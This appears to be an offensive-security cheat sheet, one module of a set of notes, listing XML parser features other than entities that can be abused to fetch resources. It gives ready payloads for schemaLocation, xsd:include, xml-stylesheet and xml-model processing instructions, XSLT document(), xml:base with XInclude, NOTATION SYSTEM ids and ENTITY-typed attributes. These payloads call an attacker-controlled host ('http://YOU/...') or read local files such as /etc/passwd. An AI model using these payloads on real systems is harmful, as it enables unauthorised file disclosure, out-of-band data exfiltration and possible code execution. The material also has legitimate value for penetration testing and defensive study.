# Parser Abuse — features that fetch besides entities

## The non-entity fetchers — the XXE-adjacent surface

Entities are the famous path, but an XML parser has other fetch
mechanisms. Each is its own falsifier target.

## `xsi:schemaLocation` / `xsi:noNamespaceSchemaLocation`

```xml
<r xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="urn:x http://YOU/s.xsd">
```

If the parser validates (`SchemaFactory`, `XMLSchema` attribute
checking), it fetches the schema URI — OOB hit without any DOCTYPE.

## `xsd:import`/`xsd:include`/`xsd:redefine` — inside a schema

If the app itself loads an XSD you control (a schema-upload feature):

```xml
<xsd:schema xmlns:xsd="...">
  <xsd:include schemaLocation="http://YOU/s.xsd"/>
</xsd:schema>
```

## `xml-model` PI — the schema-declaration PI

```xml
<?xml-model href="http://YOU/s.rng" type="application/xml"?>
```

A validating processor fetches the referenced schema.

## `xml-stylesheet` PI — the XSLT fetch

```xml
<?xml-stylesheet type="text/xsl" href="http://YOU/x.xsl"?>
<?xml-stylesheet type="text/css" href="http://YOU/x.css"?>
```

XSLT fetch → if evaluated, XSLT is code — `xxe-to-rce.md`.

## `xsl:include`/`xsl:import`/`document()` — inside a stylesheet

If you control an XSLT (an XSLT-upload or a referenced stylesheet):

```xml
<xsl:include href="http://YOU/x.xsl"/>
<xsl:value-of select="document('file:///flag')"/>
```

`document()` reads arbitrary URIs — an XSLT-internal file-read that
works even when entities are off.

## `xinclude` — the dedicated bypass

`xinclude.md` — `<xi:include href=...>` — deserves its own module.

## `xml:base` — the resolution base

```xml
<r xml:base="file:///">
  <xi:include href="etc/passwd" parse="text"/>
</r>
```

Relative URI resolution against an injected `xml:base`.

## `<math>`/MathML/DocBook/DITA transclusions

MathML `<annotation-xml>`, DocBook `conref`, DITA `conref`/`topicref`/
`keyref` — content-reuse features that fetch.

## `NOTATION SYSTEM` — the declaring fetch

```xml
<!NOTATION n SYSTEM "file:///etc/passwd">
```

The notation's SYSTEM-id is fetched during declaration — a fetch that
needs no `&x;` in the body at all.

## `ATTLIST` default + `ENTITY`/`ENTITIES` type

```xml
<!ATTLIST r a ENTITIES #IMPLIED>
<!ENTITY u SYSTEM "file:///flag" NDATA n>
<r a="u"/>
```

Attribute of type `ENTITY` references an unparsed entity — the parser
loads it.

## `xml-model`/`xsi:schemaLocation` + `catalog` files

OASIS XML catalogs map public/system ids to local files — a catalog
you control (`catalog.xml` upload) redirects fetches — supply-chain
flavor of XXE.

## `entityResolver`/`LSResourceResolver`/`XmlResolver` — the code hook

A custom resolver class is the app's own fetch code — if the resolver
is set to `null` → safe; if set to `XmlUrlResolver()`/`URLResolver` →
external fetches live. The resolver is code — grep it.

## Falsifiers

- resolver = null + no XInclude + no schema-validation → the doc is
  truly isolated → dead
